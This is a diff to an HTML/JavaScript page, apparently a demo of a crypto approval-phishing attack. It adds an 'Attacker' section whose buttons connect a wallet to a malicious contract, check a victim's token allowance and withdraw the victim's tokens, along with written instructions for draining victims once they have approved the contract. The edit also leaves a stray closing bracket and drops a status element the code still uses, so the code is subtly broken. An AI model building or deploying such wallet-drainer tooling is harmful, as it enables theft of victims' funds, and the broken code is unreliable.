@@ -90,34 +90,44 @@
         </script>
     </div>
 
-    <!-- Attacker Section -->
-    <div id="attackerSection">
-        <h2>Attacker: Interact with Malicious Contract</h2>
-        <button id="connectAttackerWalletBtn">Connect Attacker Wallet</button>
-        <button id="checkAllowanceBtn" disabled>Check Allowance</button>
-        <button id="transferTokensBtn" disabled>Withdraw Tokens</button>
-        <p id="attackerStatus"></p>
-        <h3>Instructions for Attacker:</h3>
-        <p>Once the victim has approved the malicious contract, you can check the allowance, withdraw tokens from the victim's account, or withdraw tokens as the deployer.</p>
+<!-- Attacker Section -->
+<div id="attackerSection">
+    <h2>Attacker: Interact with Malicious Contract</h2>
+    <button id="connectAttackerWalletBtn">Connect Attacker Wallet</button>
+    <button id="checkAllowanceBtn" disabled>Check Allowance</button>
+    <button id="transferTokensBtn" disabled>Withdraw Tokens</button>
+    <button id="deployerWithdrawBtn" disabled>Deployer Withdraw</button>
 
-        <script>
-            // Connect Attacker Wallet
-            document.getElementById("connectAttackerWalletBtn").addEventListener("click", connectAttackerWallet);
-            
-            async function connectAttackerWallet() {
-                if (typeof window.ethereum !== 'undefined') {
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    web3 = new Web3(window.ethereum);
-                    accounts = await web3.eth.getAccounts();
-                    document.getElementById('attackerStatus').innerText = `Connected: ${accounts[0]}`;
-                    maliciousContract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress);
-                    tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
-                    document.getElementById("checkAllowanceBtn").disabled = false;
-                    document.getElementById("transferTokensBtn").disabled = false;
-                } else {
-                    alert("Please install MetaMask!");
-                }
-            }
+    <h3>Instructions for Attacker:</h3>
+    <p>Once the victim has approved the malicious contract, you can check the allowance, withdraw tokens from the victim's account, or withdraw tokens as the deployer.</p>
+</div>
+
+<script>
+// Attacker wallet connection function
+document.getElementById("connectAttackerWalletBtn").addEventListener("click", connectAttackerWallet);
+
+async function connectAttackerWallet() {
+    if (typeof window.ethereum !== 'undefined') {
+        // Request accounts access from MetaMask
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        web3 = new Web3(window.ethereum);
+        accounts = await web3.eth.getAccounts();
+        document.getElementById('attackerStatus').innerText = `Connected: ${accounts[0]}`;
+
+        // Initialize the malicious contract and token contract
+        contract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress);
+        tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+
+        // Enable the attacker's buttons once wallet is connected
+        document.getElementById("checkAllowanceBtn").disabled = false;
+        document.getElementById("transferTokensBtn").disabled = false;
+        document.getElementById("deployerWithdrawBtn").disabled = false;
+    } else {
+        alert("Please install MetaMask!");
+    }
+}
+  });
+
 
             // Check Allowance
             document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
